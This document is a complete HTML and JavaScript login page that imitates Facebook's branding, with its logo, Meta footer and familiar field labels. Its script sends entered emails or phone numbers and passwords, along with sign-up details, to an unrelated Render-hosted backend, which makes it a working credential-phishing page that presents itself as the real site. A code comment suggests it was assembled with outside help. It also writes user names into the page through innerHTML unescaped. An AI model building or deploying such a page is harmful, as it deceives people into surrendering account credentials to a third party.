<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  }
  body {
    background: #f0f2f5;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
  }
  .container {
    padding: 40px 20px 20px;
  }
  .logo {
    display: flex;
    justify-content: center;
    margin-top: 20px;
    margin-bottom: 40px;
  }
  .logo-circle {
    width: 64px;
    height: 64px;
    border-radius: 50%;
    background: linear-gradient(145deg, #1877f2, #0e5ed7);
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    font-size: 42px;
    font-weight: bold;
  }
  .input {
    width: 100%;
    padding: 18px;
    border-radius: 16px;
    border: 1px solid #ccd0d5;
    background: #f5f6f7;
    font-size: 16px;
    margin-bottom: 14px;
  }
  .login-btn, .create-btn, .submit-btn {
    width: 100%;
    padding: 16px;
    border-radius: 30px;
    border: none;
    background: #1877f2;
    color: white;
    font-size: 17px;
    font-weight: 600;
    margin-top: 10px;
    cursor: pointer;
  }
  .login-btn:hover {
    background: #1663c7;
  }
  .forgot {
    text-align: center;
    margin-top: 18px;
    font-size: 15px;
    color: #1877f2;
    cursor: pointer;
  }
  .bottom {
    padding: 0 20px 30px;
  }
  .create-btn {
    background: transparent;
    border: 1.5px solid #1877f2;
    color: #1877f2;
  }
  .create-btn:hover {
    background: #e7f3ff;
  }
  .meta {
    text-align: center;
    margin-top: 18px;
    font-size: 14px;
    color: #606770;
  }
  .modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    justify-content: center;
    align-items: center;
    z-index: 1000;
  }
  .modal.active {
    display: flex;
  }
  .modal-content {
    background: white;
    border-radius: 20px;
    width: 90%;
    max-width: 450px;
    padding: 20px;
  }
  .modal-header {
    font-size: 24px;
    font-weight: 700;
    margin-bottom: 20px;
  }
  .modal-close {
    float: right;
    font-size: 28px;
    cursor: pointer;
  }
  .form-group {
    margin-bottom: 15px;
  }
  .form-group label {
    display: block;
    margin-bottom: 5px;
    font-weight: 500;
  }
  .form-group input {
    width: 100%;
    padding: 12px;
    border: 1px solid #ddd;
    border-radius: 8px;
    font-size: 15px;
  }
  .error-message {
    color: #e41e3f;
    font-size: 13px;
    margin-top: 5px;
    text-align: center;
  }
  .user-info {
    background: #e8f0fe;
    padding: 15px;
    border-radius: 12px;
    margin-top: 15px;
    text-align: center;
  }
  .logout-btn {
    background: #e41e3f;
    margin-top: 10px;
  }
  .message-bar {
    position: fixed;
    bottom: 20px;
    left: 20px;
    right: 20px;
    background: #333;
    color: white;
    padding: 12px;
    border-radius: 30px;
    text-align: center;
    display: none;
    z-index: 1000;
  }
  .message-bar.show {
    display: block;
  }
</style>
</head>
<body>

<div class="container" id="app">
  <div class="logo">
    <div class="logo-circle">f</div>
  </div>

  <div id="loginForm">
    <input class="input" type="text" id="identifier" placeholder="Mobile number or email address">
    <input class="input" type="password" id="password" placeholder="Password">
    <button class="login-btn" id="loginBtn">Log in</button>
    <div class="forgot" id="forgotBtn">Forgotten password?</div>
  </div>

  <div id="loggedInView" style="display: none;">
    <div class="user-info" id="userInfo"></div>
    <button class="logout-btn" id="logoutBtn">Log out</button>
  </div>
</div>

<div class="bottom">
  <button class="create-btn" id="showCreateBtn">Create new account</button>
  <div class="meta">Ⓜ️ <span>Meta</span></div>
</div>

<div id="createModal" class="modal">
  <div class="modal-content">
    <span class="modal-close" id="closeCreateModal">&times;</span>
    <div class="modal-header">Create a new account</div>
    <div class="form-group">
      <label>Full Name</label>
      <input type="text" id="regName" placeholder="Full name">
    </div>
    <div class="form-group">
      <label>Email</label>
      <input type="email" id="regEmail" placeholder="Email address">
    </div>
    <div class="form-group">
      <label>Phone (optional)</label>
      <input type="tel" id="regPhone" placeholder="Phone number">
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" id="regPassword" placeholder="Password (min 6 characters)">
    </div>
    <div id="regError" class="error-message"></div>
    <button class="submit-btn" id="registerBtn">Sign Up</button>
  </div>
</div>

<div id="messageBar" class="message-bar"></div>

<script>
// THIS IS THE FIX - Using your actual Render URL
const API_URL = 'https://facebook-login-backend-muau.onrender.com/api';
let authToken = localStorage.getItem('authToken');

function showMessage(message, isError = true) {
  const bar = document.getElementById('messageBar');
  bar.textContent = message;
  bar.style.backgroundColor = isError ? '#e41e3f' : '#31a24c';
  bar.classList.add('show');
  setTimeout(() => bar.classList.remove('show'), 3000);
}

function setLoggedInState(user) {
  document.getElementById('loginForm').style.display = 'none';
  document.getElementById('loggedInView').style.display = 'block';
  document.getElementById('userInfo').innerHTML = `<strong>Welcome, ${user.name}!</strong><br>${user.email || user.phone}`;
}

function setLoggedOutState() {
  document.getElementById('loginForm').style.display = 'block';
  document.getElementById('loggedInView').style.display = 'none';
  authToken = null;
  localStorage.removeItem('authToken');
}

async function handleLogin() {
  const identifier = document.getElementById('identifier').value.trim();
  const password = document.getElementById('password').value;
  
  if (!identifier || !password) {
    showMessage('Please enter both email and password');
    return;
  }
  
  showMessage('Logging in...', false);
  
  try {
    const response = await fetch(`${API_URL}/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ identifier, password })
    });
    
    const data = await response.json();
    
    if (response.ok) {
      authToken = data.token;
      localStorage.setItem('authToken', authToken);
      setLoggedInState(data.user);
      showMessage('Login successful!', false);
      document.getElementById('password').value = '';
    } else {
      showMessage(data.error || 'Login failed');
    }
  } catch (error) {
    showMessage('Error: ' + error.message);
  }
}

async function handleRegister() {
  const name = document.getElementById('regName').value.trim();
  const email = document.getElementById('regEmail').value.trim();
  const phone = document.getElementById('regPhone').value.trim();
  const password = document.getElementById('regPassword').value;
  const errorDiv = document.getElementById('regError');
  
  errorDiv.textContent = '';
  
  if (!name) {
    errorDiv.textContent = 'Name is required';
    return;
  }
  if (!email && !phone) {
    errorDiv.textContent = 'Email or phone is required';
    return;
  }
  if (password.length < 6) {
    errorDiv.textContent = 'Password must be at least 6 characters';
    return;
  }
  
  try {
    const response = await fetch(`${API_URL}/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name, email: email || undefined, phone: phone || undefined, password })
    });
    
    const data = await response.json();
    
    if (response.ok) {
      document.getElementById('createModal').classList.remove('active');
      authToken = data.token;
      localStorage.setItem('authToken', authToken);
      setLoggedInState(data.user);
      showMessage('Account created!', false);
      document.getElementById('regName').value = '';
      document.getElementById('regEmail').value = '';
      document.getElementById('regPhone').value = '';
      document.getElementById('regPassword').value = '';
    } else {
      errorDiv.textContent = data.error || 'Registration failed';
    }
  } catch (error) {
    errorDiv.textContent = 'Network error: ' + error.message;
  }
}

async function handleLogout() {
  if (authToken) {
    try {
      await fetch(`${API_URL}/logout`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
    } catch(e) {}
  }
  setLoggedOutState();
  showMessage('Logged out', false);
}

async function checkAuth() {
  if (!authToken) return;
  try {
    const response = await fetch(`${API_URL}/me`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (response.ok) {
      const data = await response.json();
      setLoggedInState(data.user);
    } else {
      setLoggedOutState();
    }
  } catch(e) {
    setLoggedOutState();
  }
}

// Event listeners
document.getElementById('loginBtn').addEventListener('click', handleLogin);
document.getElementById('showCreateBtn').addEventListener('click', () => document.getElementById('createModal').classList.add('active'));
document.getElementById('closeCreateModal').addEventListener('click', () => document.getElementById('createModal').classList.remove('active'));
document.getElementById('registerBtn').addEventListener('click', handleRegister);
document.getElementById('logoutBtn').addEventListener('click', handleLogout);
document.getElementById('password').addEventListener('keypress', (e) => { if(e.key === 'Enter') handleLogin(); });
document.getElementById('forgotBtn').addEventListener('click', () => showMessage('Password reset feature coming soon'));

window.addEventListener('click', (e) => {
  if (e.target.classList.contains('modal')) {
    e.target.classList.remove('active');
  }
});

checkAuth();
</script>

</body>
</html>
